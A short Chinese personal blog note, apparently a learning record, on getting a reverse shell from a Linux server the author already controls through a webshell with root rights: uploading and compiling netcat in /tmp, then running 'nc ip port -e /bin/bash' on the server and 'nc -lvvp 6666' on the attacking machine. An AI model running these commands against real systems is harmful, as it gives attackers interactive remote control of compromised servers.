---
title: 记一次linux反弹shell
date: 2018-01-27 12:30:53
tags:
	- notes
categories:
	- notes

---

![](https://ws1.sinaimg.cn/large/006Y6f53ly1fnv3p4s7hbj30o80araap.jpg)

<!--more-->

Linux 反弹shell,一直都有听说过，可惜自己不会。今天受xz指点，学会了。特记录一下。

![](https://ws1.sinaimg.cn/large/006Y6f53ly1fnv2976wsfj30md03zjr7.jpg)


`root`权限，非常好，省得提权了。

由于Linux``我们在`webshell`里面是不好进行交互的，所以我们需要进行反弹`shell`操作。


首页我们通过`webshell`上传`nc`源码到`linux`服务器上

![](https://ws1.sinaimg.cn/large/006Y6f53ly1fnv2c7fxvbj30lf06e745.jpg)



然后我们进行解压、编译操作


 `tar -zxvf /tmp/nc/netcat.tar.gz -C /tmp/nc`


![](https://ws1.sinaimg.cn/large/006Y6f53ly1fnv2evqruxj30t50i50tb.jpg)


由于在webshell里面无法切换目录，而编译文件需要在源码目录下进行。
所以我们可以编写一个sh脚本，让它执行编译操作。


`/tmp/nc/netcat-0.7.1/./configure --prefix=/tmp/nc/netcat/ && make && make install`

![](https://ws1.sinaimg.cn/large/006Y6f53ly1fnv3drbz77j30hi0gj747.jpg)

![](https://ws1.sinaimg.cn/large/006Y6f53ly1fnv3ejo1y1j30hv07n746.jpg)


最后就是最重要的看点，`linux`反弹`shell`。

服务端执行如下命令：

    nc ip port -e /bin/bash

![](https://ws1.sinaimg.cn/large/006Y6f53ly1fnv3mcwt9ej30k1053wee.jpg)

攻击端进行监听：

    nc -lvvp 6666

![](https://ws1.sinaimg.cn/large/006Y6f53ly1fnv3mz4h1hj30gq03ojra.jpg)


反弹`shell`成功

![](https://ws1.sinaimg.cn/large/006Y6f53ly1fnv3p4s7hbj30o80araap.jpg)

</br>
**总结**：

- 学会请教人，自己不会，但可以请教有经验的人把它学会。
- 方法很重要



